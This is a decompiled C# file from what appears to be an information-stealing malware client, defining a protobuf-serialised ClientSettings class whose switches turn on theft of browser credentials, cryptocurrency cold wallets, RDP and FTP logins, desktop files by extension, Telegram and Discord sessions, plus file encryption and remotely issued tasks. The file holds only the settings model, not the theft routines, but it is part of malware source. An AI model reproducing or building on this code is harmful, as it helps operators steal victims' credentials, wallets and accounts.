using System;
using System.ComponentModel;
using NoiseMe.Drags.App.Models.Common;
using ProtoBuf;

namespace NoiseMe.Drags.App.Models
{
	// Token: 0x02000084 RID: 132
	[ProtoContract(Name = "ClientSettings")]
	public class ClientSettings : INotifyPropertyChanged
	{
		// Token: 0x1700010C RID: 268
		// (get) Token: 0x06000469 RID: 1129 RVA: 0x00004AC8 File Offset: 0x00002CC8
		// (set) Token: 0x0600046A RID: 1130 RVA: 0x00004AD0 File Offset: 0x00002CD0
		[ProtoMember(1, Name = "GrabBrowserCredentials")]
		public bool GrabBrowserCredentials
		{
			get
			{
				return this._grabBrowserCredentials;
			}
			set
			{
				this._grabBrowserCredentials = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabBrowserCredentials"));
			}
		}

		// Token: 0x1700010D RID: 269
		// (get) Token: 0x0600046B RID: 1131 RVA: 0x00004AF4 File Offset: 0x00002CF4
		// (set) Token: 0x0600046C RID: 1132 RVA: 0x00004AFC File Offset: 0x00002CFC
		[ProtoMember(2, Name = "GrabColdWallets")]
		public bool GrabColdWallets
		{
			get
			{
				return this._grabColdWallets;
			}
			set
			{
				this._grabColdWallets = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabColdWallets"));
			}
		}

		// Token: 0x1700010E RID: 270
		// (get) Token: 0x0600046D RID: 1133 RVA: 0x00004B20 File Offset: 0x00002D20
		// (set) Token: 0x0600046E RID: 1134 RVA: 0x00004B28 File Offset: 0x00002D28
		[ProtoMember(3, Name = "GrabRdp")]
		public bool GrabRdp
		{
			get
			{
				return this._grabRdp;
			}
			set
			{
				this._grabRdp = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabRdp"));
			}
		}

		// Token: 0x1700010F RID: 271
		// (get) Token: 0x0600046F RID: 1135 RVA: 0x00004B4C File Offset: 0x00002D4C
		// (set) Token: 0x06000470 RID: 1136 RVA: 0x00004B54 File Offset: 0x00002D54
		[ProtoMember(4, Name = "GrabFtp")]
		public bool GrabFtp
		{
			get
			{
				return this._grabFtp;
			}
			set
			{
				this._grabFtp = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabFtp"));
			}
		}

		// Token: 0x17000110 RID: 272
		// (get) Token: 0x06000471 RID: 1137 RVA: 0x00004B78 File Offset: 0x00002D78
		// (set) Token: 0x06000472 RID: 1138 RVA: 0x00004B80 File Offset: 0x00002D80
		[ProtoMember(5, Name = "GrabDesktopFiles")]
		public bool GrabDesktopFiles
		{
			get
			{
				return this._grabDesktopFiles;
			}
			set
			{
				this._grabDesktopFiles = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabDesktopFiles"));
			}
		}

		// Token: 0x17000111 RID: 273
		// (get) Token: 0x06000473 RID: 1139 RVA: 0x00004BA4 File Offset: 0x00002DA4
		// (set) Token: 0x06000474 RID: 1140 RVA: 0x00004BAC File Offset: 0x00002DAC
		[ProtoMember(6, Name = "DesktopExtensions")]
		public BindingList<string> DesktopExtensions
		{
			get
			{
				return this._desktopExtensions;
			}
			set
			{
				this._desktopExtensions = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("DesktopExtensions"));
			}
		}

		// Token: 0x17000112 RID: 274
		// (get) Token: 0x06000475 RID: 1141 RVA: 0x00004BD0 File Offset: 0x00002DD0
		// (set) Token: 0x06000476 RID: 1142 RVA: 0x00004BD8 File Offset: 0x00002DD8
		[ProtoMember(7, Name = "GrabTelegram")]
		public bool GrabTelegram
		{
			get
			{
				return this._grabTelegram;
			}
			set
			{
				this._grabTelegram = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabTelegram"));
			}
		}

		// Token: 0x17000113 RID: 275
		// (get) Token: 0x06000477 RID: 1143 RVA: 0x00004BFC File Offset: 0x00002DFC
		// (set) Token: 0x06000478 RID: 1144 RVA: 0x00004C04 File Offset: 0x00002E04
		[ProtoMember(8, Name = "GrabDiscord")]
		public bool GrabDiscord
		{
			get
			{
				return this._grabDiscord;
			}
			set
			{
				this._grabDiscord = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("GrabDiscord"));
			}
		}

		// Token: 0x17000114 RID: 276
		// (get) Token: 0x06000479 RID: 1145 RVA: 0x00004C28 File Offset: 0x00002E28
		// (set) Token: 0x0600047A RID: 1146 RVA: 0x00004C30 File Offset: 0x00002E30
		[ProtoMember(9, Name = "EncryptFiles")]
		public bool EncryptFiles
		{
			get
			{
				return this._encryptFiles;
			}
			set
			{
				this._encryptFiles = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("EncryptFiles"));
			}
		}

		// Token: 0x17000115 RID: 277
		// (get) Token: 0x0600047B RID: 1147 RVA: 0x00004C54 File Offset: 0x00002E54
		// (set) Token: 0x0600047C RID: 1148 RVA: 0x00004C5C File Offset: 0x00002E5C
		[ProtoMember(10, Name = "Tasks")]
		public BindingList<RemoteTask> Tasks
		{
			get
			{
				return this._tasks;
			}
			set
			{
				this._tasks = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Tasks"));
			}
		}

		// Token: 0x14000003 RID: 3
		// (add) Token: 0x0600047D RID: 1149 RVA: 0x00016754 File Offset: 0x00014954
		// (remove) Token: 0x0600047E RID: 1150 RVA: 0x0001678C File Offset: 0x0001498C
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x040001C9 RID: 457
		private bool _grabBrowserCredentials;

		// Token: 0x040001CA RID: 458
		private bool _grabColdWallets;

		// Token: 0x040001CB RID: 459
		private bool _grabRdp;

		// Token: 0x040001CC RID: 460
		private bool _grabFtp;

		// Token: 0x040001CD RID: 461
		private bool _grabDesktopFiles;

		// Token: 0x040001CE RID: 462
		private bool _grabTelegram;

		// Token: 0x040001CF RID: 463
		private bool _grabDiscord;

		// Token: 0x040001D0 RID: 464
		private bool _encryptFiles;

		// Token: 0x040001D1 RID: 465
		private BindingList<RemoteTask> _tasks;

		// Token: 0x040001D2 RID: 466
		private BindingList<string> _desktopExtensions;
	}
}
